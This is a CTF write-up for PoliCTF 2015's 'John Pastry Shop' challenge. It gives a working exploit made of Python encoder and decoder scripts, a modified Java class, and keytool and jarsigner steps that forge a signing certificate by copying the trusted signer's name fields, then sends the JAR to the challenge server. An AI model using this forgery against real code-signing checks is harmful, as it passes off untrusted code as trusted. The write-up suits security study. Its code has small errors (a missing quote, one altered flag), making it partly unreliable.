---
title: "PoliCTF 2015 - John Pastry Shop (Pwnable 100)"
header:
  overlay_image: /assets/images/polictf2015/pastryshop.jpg
  overlay_filter: 0.5
tags:
  - polictf2015
  - writeup
  - pwn
---

Fake a valid cake object containing arbitrary ingredients to a bakery service by
modifying decompiled Java bytecode and resigning the JAR with spoofed
credentials.

## Challenge Description

#### Points

100

#### Description

```
Among his hobbies, John likes baking cakes to eat during the warm afternoons in
Milan. He is damn good at this such that, a couple of months ago, he decided to
open a pastry shop on his own. The shop was an immediate success and John needed
to bake just so many cakes that he decided to outsource the production of his
famous NewYorkCheeseCake to another external and trusted pastry shop, the
Shamano's (see shamanoPastryShop.pem). John provided Shamano's with the original
basic recipe of his Cake (see Cake.java) and, after his customization, Shamano
returns to John a cake container holding the NewYorkCheeseCake (see
ShamanoCakeContainerEncoded.jar). Notice that Shamano has to follow John's
directions carefully and that is why he always have to encode properly his cake
containers so that John can verify all of them accordingly to a fixed decoding
process (see extract of source code in Decode.java). John always tries his best
for verifying the quality and genuineness of the incoming NewYorkCheeseCake but,
you know, to busy people, like he is, it may sometimes happen to forget to
check something... You can find the shop at

    pastry.polictf.it:80
```

## Solution

We have a tar.gz file containing the files required to solve this challenge:

```shell
$ tar tvf pastryshop.tar.gz
drwxrwxr-x andrea/andrea     0 2015-06-18 05:17 john-pastry-shop/
-rw-rw-r-- andrea/andrea   871 2015-06-17 00:32 john-pastry-shop/Cake.java
-rw-rw-r-- andrea/andrea  2627 2015-05-22 21:28 john-pastry-shop/ShamanoCakeContainerEncoded.jar
-rw-rw-r-- andrea/andrea  1889 2015-05-22 21:28 john-pastry-shop/Decode.java
```

Looks like we are given an example of a properly prepared 'NewYorkCheeseCake in
a well encoded JAR container, as well as the decoding routines (Decode.java) and
a description of what the cake must conform to (Cake.java).

Here are the contents of the Decode.java file:

```java
/*
*  John Decoding System:
*
*  Dear Shamano,
*  This is how I will check whether you have properly prepared my cake containers.
*  Please take into account these guidelines carefully before sending back the cake containers!
*  If your cake container won't comply to the current rules, I'll reject them immediately!
*
*  Best,
*  John, the Pastry Master.
*
*/

// ..Extract from the decoding system..

// These are the special bytes for the encoding/decoding.
private static final byte INIT_BYTE = (byte) 0x17;
private static final byte ESCAPE_BYTE = (byte) 0x18;
private static final byte EXIT_BYTE = (byte) 0x19;

// These are helper flags.
private static boolean isValidData = false;
private static boolean isEscapingMode = false;
private static boolean isSequenceClosed = false;


// Decoder behavior for the input cake containers:
// ouputStream holds a FileOutputStream, which writes the
// decoded version of the file..
int read;

while ((read = System.in.read()) != -1 && !isSequenceClosed) {

    if ((byte) read == INIT_BYTE && !isEscapingMode)
        isValidData = true;
        else {

            if ((byte) read == EXIT_BYTE && !isEscapingMode) {
            isValidData = false;
                        isSequenceClosed = true;
                }
                else {

                    if (!isEscapingMode && (byte) read == ESCAPE_BYTE)
                        isEscapingMode = true;
                        else {

                            if (isEscapingMode && !isValidData)
                                    isEscapingMode = false;
                                else {

                                    if (isValidData) {
                                        isEscapingMode = false;
                                        outputStream.write((byte) read);
                                    }
                                }
                        }

                    }
                }
        }

}
```

and the Cake.java file:

```java
package it.polimi.necst.johncakedesigner;

import com.sun.istack.internal.NotNull;

import java.util.LinkedList;
import java.util.List;

/**
 * A Cake class, standard of John's Pastry Shop, that other Cake objects can extend to build on top of it.
 *
 * Created by luca on 15/04/15.
 */
public abstract class Cake {

    protected boolean shouldBeAddedTheSpecialIngredient;
    protected List<String> ingredientsList;

    // Zero constructor
    protected Cake() {
        shouldBeAddedTheSpecialIngredient = false;
        ingredientsList = new LinkedList<>();
    }

    // To be implemented in the classes that extends this one.
    // by filling up the ingredientsList with all the ingredients
    // of the extending Cake.
    public abstract void addIngredientsToCake();

    public @NotNull List<String> getIngredients() {

        return ingredientsList;
    }
}
```

ne very key thing to notice in the Cake.java file is the existence of a
*protected boolean* **shouldBeAddedTheSpecialIngredient**. This is an indication that
we are required to set this variable to true in order to perhaps get our flag.

Now, the next thing we do is try and investigate the service.

Hmm, let's try using the provided ShamanoCakeContainerEncoded.jar.

```shell
Welcome to John's Pastry Shop!
In John's opinion this cake container seems a trusted one from Shamano's Pastry Shop.
And it also contains a valid NewYorkCheeseCake.
This seems a tasty cake!
Here are its ingredients:
* Cream Cheese
* Biscuits
* Sugar
* Isinglass
Thanks for visiting John's Pastry Shop!
```

There seems to be two checks here: 1) some kind of signature verification, and
2) the existence of a valid NewYorkCheeseCake. We can examine the JAR for more
information.

```shell
$ java -jar ShamanoCakeContainerEncoded.jar
Error: Invalid or corrupt jarfile ShamanoCakeContainerEncoded.jar
$ file ShamanoCakeContainerEncoded.jar
ShamanoCakeContainerEncoded.jar: data
```

But wait, the JAR isn't valid at this point in time. So we have to write a
decoder to make it a valid JAR.

```python
import sys

INIT_BYTE = 0x17
ESCAPE_BYTE = 0x18
EXIT_BYTE = 0x19

isValidData = False
isEscapingMode = False
isSequenceClosed = False

data = file(sys.argv[1]).read()
of = file(sys.argv[2],'w')

for i in data:
    i = ord(i)
    if i == INIT_BYTE and not isEscapingMode:
        isValidData = True
    else:
        if i == EXIT_BYTE and not isEscapingMode:
            isValidData = False
            isSequenceClosed = False
        else:
            if not isEscapingMode and i == ESCAPE_BYTE:
                isEscapingMode = True
            else:
                if isEscapingMode and not isValidData:
                    isEscapingMode = False
                else:
                    if isValidData:
                        isEscapingMode = False
                        of.write(chr(i))
```

There are three things in this encoding scheme: an init marker (0x17), an exit
marker (0x19), and an escape marker (0x18). The init marker denotes the start of
the container, the exit marker denotes the end of the container, and the escape
marker escapes data bytes if these bytes match any one of the special markers in
the encoding scheme. Decoding our file:

```shell
$ python decoder.py ShamanoCakeContainerEncoded.jar shamanodecoded.jar
$ file shamanodecoded.jar
shamanodecoded.jar: Zip archive data, at least v2.0 to extract
$ unzip -l shamanodecoded.jar
Archive:  shamanodecoded.jar
  Length      Date    Time    Name
---------  ---------- -----   ----
      177  2015-04-15 18:28   META-INF/MANIFEST.MF
      298  2015-04-15 18:28   META-INF/SHAMANO_.SF
     1441  2015-04-15 18:28   META-INF/SHAMANO_.RSA
      676  2015-04-16 00:26   it/polimi/necst/johncakedesigner/NewYorkCheeseCake.class
---------                     -------
     2592                     4 files
```

Great, our file is decoded and we can identify that the JAR is indeed signed and
contains a NewYorkCheeseCake.class. Let's decompile the NewYorkCheeseCake class
file using [Java Decompiler](http://jd.benow.ca/).

```java
package it.polimi.necst.johncakedesigner;

import java.util.List;

public class NewYorkCheeseCake
  extends Cake
{
  public void addIngredientsToCake()
  {
    this.ingredientsList.add("Cream Cheese");
    this.ingredientsList.add("Biscuits");
    this.ingredientsList.add("Sugar");
    this.ingredientsList.add("Isinglass");
  }
}
```

Looks like a simple job of writing our own payload within
`addIngredientsToCake()`. We will simply assign our secret ingredient to be
true.

```java
package it.polimi.necst.johncakedesigner;

import java.util.List;
import java.util.Scanner;
import java.io.*;

public class NewYorkCheeseCake
  extends Cake
{
    public void addIngredientsToCake()
    {
    this.shouldBeAddedTheSpecialIngredient = true;
    this.ingredientsList.add(Dystopian");
    this.ingredientsList.add("Narwhals");
    this.ingredientsList.add("Pwns");
    this.ingredientsList.add("Your Shop");
    }
}
```

Then we may compile and package this into a JAR.

```shell
$ javac NewYorkCheeseCake.java Cake.java
$ cp NewYorkCheeseCake.class it/polimi/necst/johncakedesigner/
$ jar cvf exploit.jar it/
$
```

Let's try sending this to John's Pastry Shop:

Ahh, right we need to encode it again. We have to write another script to do
this:

```python
import sys

inp = sys.argv[1]
outp = sys.argv[2]

INIT_BYTE = chr(0x17)
ESCAPE_BYTE = chr(0x18)
EXIT_BYTE = chr(0x19)

data = file(inp).read()
predata = list(data)
postdata = list(data)
offset = 0
for i in range(len(predata)):
    if predata[i] in [INIT_BYTE, ESCAPE_BYTE, EXIT_BYTE]:
        postdata.insert(i+offset, ESCAPE_BYTE)
        offset += 1

postdata.insert(0, INIT_BYTE)
postdata.insert(len(postdata), EXIT_BYTE)

file(outp, 'w').write("".join(postdata))
```

Encoding the JAR file:

```python
$ python encoder.py exploit.jar encodedexploit.jar
$
```

Now let's try sending it over again:

Ack, so they do verify that the JAR is signed. Well, let's see if we can get our
signing certificate as close to Shamano's one as possible. First, we convert the
certificate found in the original Shamano JAR file and examine it.

```shell
$ openssl pkcs7 -in META-INF/SHAMANO_.RSA -print_certs -inform DER -out shamano.cer
$ openssl x509 -in shamano.cer -text
Certificate:
    Data:
        Version: 3 (0x2)
        Serial Number: 395913789 (0x17992a3d)
    Signature Algorithm: sha256WithRSAEncryption
        Issuer: C=IT, ST=Italy, L=Milano, O=Shamano Inc., OU=Shamano Cooking Service, CN=Shamano Pastry Shop
        Validity
            Not Before: Apr 15 12:31:11 2015 GMT
            Not After : Aug 31 12:31:11 2042 GMT
        Subject: C=IT, ST=Italy, L=Milano, O=Shamano Inc., OU=Shamano Cooking Service, CN=Shamano Pastry Shop
        Subject Public Key Info:
            Public Key Algorithm: rsaEncryption
                Public-Key: (2048 bit)
                Modulus:
                    00:8f:71:bf:fe:4e:db:c3:ef:c7:fb:0a:10:18:90:
                    26:5d:7b:a9:e2:b1:9f:16:45:01:d6:54:00:d1:ab:
                    a5:4a:0c:d8:7e:03:2f:97:e6:bf:f9:03:9a:b5:1a:
... snip ...
CXkhv0aebg/SU2ffTDsvjPeIGTijaTUkvsiu+sw40w/yrUCYOCL6cXrunVznC+M5
uBXuNcesk1LuIY9EIZcoACkjRRpghdJ9ljk7Q2DXHw==
-----END CERTIFICATE-----
```

Now, we are going to use the details found in this certificate to create our own
spoof certificate. We suspect that the verification of the signature only takes
into account the fields Common Name, Organisational Unit, Organisation, and, etc
instead of actual crypto since this is only a 100 point challenge.

```shell
$ keytool -genkey -keyalg RSA -keysize 1024 -alias shamano -keystore dnkeystore
Enter keystore password:
Re-enter new password:
What is your first and last name?
  [Unknown]:  Shamano Pastry Shop
What is the name of your organizational unit?
  [Unknown]:  Shamano Cooking Service
What is the name of your organization?
  [Unknown]:  Shamano Inc.
What is the name of your City or Locality?
  [Unknown]:  Milano
What is the name of your State or Province?
  [Unknown]:  Italy
What is the two-letter country code for this unit?
  [Unknown]:  IT
Is CN=Shamano Pastry Shop, OU=Shamano Cooking Service, O=Shamano Inc., L=Milano, ST=Italy, C=IT correct?
  [no]:  yes

Enter key password for <shamano>
    (RETURN if same as keystore password):
```

Now to sign our encoded JAR,

```shell
$ jarsigner -keystore dnkeystore exploit.jar shamano
Enter Passphrase for keystore:
jar signed.

Warning:
The signer certificate will expire within six months.
No -tsa or -tsacert is provided and this jar is not timestamped. Without a timestamp, users may not be able to validate this jar after the signer certificate's expiration date (2015-10-09) or after any future revocation date.
```

We can safely ignore the warning since we aren't going to use the JAR in six
months. Re-encoding the JAR file and sending it over to the service once more...

```shell
$ python encoder.py exploit.jar signedexploit.jar
$ $ nc pastry.polictf.it 80  < signedexploit.jar
Welcome to John's Pastry Shop!
In John's opinion this cake container seems a trusted one from Shamano's Pastry Shop.
And it also contains a valid NewYorkCheeseCake.
This seems a tasty cake!
Here are its ingredients:
* Dystopian
* Narwhals
* Pwns
* Your Shop
flag{PinzimonioIsTheSecretIngredientAndANiceFlag}
Thanks for visiting John's Pastry Shop!
```

And we have our flag :)

Flag: **flag{PinzimonioIsTheSecretIngredientAndANiceFlag}**
